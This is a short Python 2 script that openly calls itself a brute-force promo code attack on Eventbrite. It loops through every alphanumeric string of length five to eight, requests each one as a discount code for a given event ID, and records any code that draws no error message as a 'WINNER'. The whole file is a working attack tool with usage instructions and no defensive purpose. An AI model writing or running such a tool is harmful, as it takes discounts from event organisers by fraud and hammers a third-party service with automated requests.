import sys
import itertools
from bs4 import BeautifulSoup
import urllib

event_id = ''
charlist = ''
payload = ''
with open('codes','w+') as f:
    f.close()

if len(sys.argv) <= 2:
    print 'promo.py: brute force promo code attack on eventbrite'
    print 'usage: python promo.py 12345678 upper'
    print 'args:'
    print '    all - uses all combinations of upper and lower case letters, plus numbers'
    print '    lower - uses lower case letters, plus numbers'
    print '    upper - uses upper case letters, plus numbers [most common]'
    
else:
    event_id = str(sys.argv[1])
    targeturl='https://www.eventbrite.com/tickets-external?eid=%s&discount=' % event_id
    arg = sys.argv[2].lower()
    if arg == 'all':
        charlist = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
    if arg == 'lower':
        charlist = 'abcdefghijklmnopqrstuvwxyz1234567890'
    if arg == 'upper':
        charlist = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for zz in range(5,9):
    for zzz in itertools.product(charlist,repeat=zz):
        payload=''.join(zzz)
        r = urllib.urlopen(targeturl+payload).read()
        soup = BeautifulSoup(r,'html.parser')
        print '[+] Trying %s' % targeturl+payload
        a = soup.find_all("div", class_="error_notification_msg")
        if not a:
            print '[+] WINNER'
            print payload
            with open('code','a+') as f:
                f.write(payload)
                f.close()
            exit